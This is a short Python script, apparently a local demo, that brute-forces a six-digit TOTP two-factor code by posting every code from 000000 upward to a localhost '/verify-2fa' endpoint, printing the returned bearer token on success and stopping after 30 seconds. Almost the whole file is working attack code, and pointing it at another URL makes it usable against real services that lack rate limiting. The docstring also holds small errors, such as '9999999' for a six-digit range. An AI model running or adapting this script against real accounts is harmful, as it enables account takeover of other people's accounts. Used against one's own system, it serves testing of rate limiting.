"""
Description: This file has a simple brute force attack where it iterates
from 000000 to 9999999 (6 digits) to try to break the 2FA. It automatically
stops after 30 seconds as that is the time the TOTP of Google Authenticator resets.
Input arguments:
1. user_id: int
2. email: stri
"""


import argparse
import itertools
import requests
import time
import sys


# Function to perform brute-force attack
def brute_force_2fa(user_id, email):
    url = "http://localhost:5001/verify-2fa"

    start_time = time.time()

    # Iterate from 000000 to 999999 (6 digits)
    for code_tuple in itertools.product("0123456789", repeat=6):

        code = "".join(code_tuple)

        payload = {"user_id": user_id, "email": email, "code": code}

        # Send the POST request to the API
        response = requests.post(url, json=payload)

        # Check if the response is successful (200 is the correct code for https)
        if response.status_code == 200:
            print(f"Success! Code {code} is valid.")
            print(f"Bearer token: {response.json().get('token')}")
            break
        else:
            print(f"Attempted code: {code}, response: {response.status_code}")

        # Check if the 30s has surpassed, if so exit.
        # Reason: TOTP resets every 30s.
        if time.time() - start_time > 30.0:
            print(f"Brute-force attack stopped after {time.time()-start_time} seconds")
            sys.exit(1)

    end_time = time.time()
    print(f"Brute-force attack completed in {end_time - start_time} seconds")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Brute-force attack for 2FA verification."
    )

    parser.add_argument("user_id", type=int)
    parser.add_argument("email", type=str)
    args = parser.parse_args()

    # Call the brute-force function with input arguments
    brute_force_2fa(args.user_id, args.email)
